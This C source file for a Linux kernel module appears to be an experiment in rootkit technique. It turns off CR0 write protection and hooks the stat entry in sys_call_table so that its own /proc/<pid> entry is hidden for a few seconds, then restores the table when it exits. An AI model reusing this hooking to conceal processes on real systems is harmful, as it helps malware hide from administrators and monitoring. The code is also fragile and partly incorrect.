#include <linux/kthread.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/mutex.h>
#include <linux/sched.h>
#include <linux/string.h>
#include <linux/delay.h>

extern void *sys_call_table[];
#define CR0_WP 0x00010000
unsigned long cr0;
asmlinkage int(* original_call) (const char *, struct stat *);


static char buf[30] = { '/', 'p', 'r', 'o', 'c', '/' };

int itoa(long num, char *buffer)
{
        int i = 0, j;
        char tmp;
        while (num > 0) {
                buffer[i + 1] = 0;
                buffer[i++] = num % 10 + '0';
                num /= 10;
        }
        j = i - 1;
        buffer[i] = 0;
        while (j >= i / 2) {
                tmp = buffer[j];
                buffer[j] = buffer[i - j - 1];
                buffer[i - j - 1] = tmp;
                j--;
        }
        return 0;
}
asmlinkage int my_sys_stat(const char *s, struct stat *st)
{
        int ret;
        ret = original_call(s, st);
        if (strcmp(s, buf) == 0) {
        	printk("s = %s\n", s);
        	printk("buf = %s\n", buf);
        	return -1;
	}
        return ret;
}

int test(void *input)
{
	int i;
        // struct task_struct *st;
        cr0 = read_cr0();
        write_cr0(cr0 & ~CR0_WP);
        original_call = sys_call_table[__NR_stat];
        sys_call_table[__NR_stat] = my_sys_stat;
        write_cr0(cr0);
        
	itoa(current->pid, buf + 6);
        printk("U can't see me(<pid> %d) now!\n", current->pid);
        printk("but 10s later you will see me\n");
        for (i = 0; i < 100; ++i)
                msleep(100);
        buf[6] = 0;
        printk("I'll exit after 20s.\n");
        msleep(20000);
        return 0;
}
static int __init thread_init(void)
{

        kthread_run(test, NULL, "test_thread");
        // pid = st->pid;
        // printk("spying on <pid> %ld\n", pid);
        return 0;
}

static void __exit thread_exit(void)
{
        cr0 = read_cr0();
        write_cr0(cr0 & ~CR0_WP);
        sys_call_table[__NR_stat] = original_call;
        write_cr0(cr0);

        return;
}
module_init(thread_init);
module_exit(thread_exit);
MODULE_LICENSE("GPL");
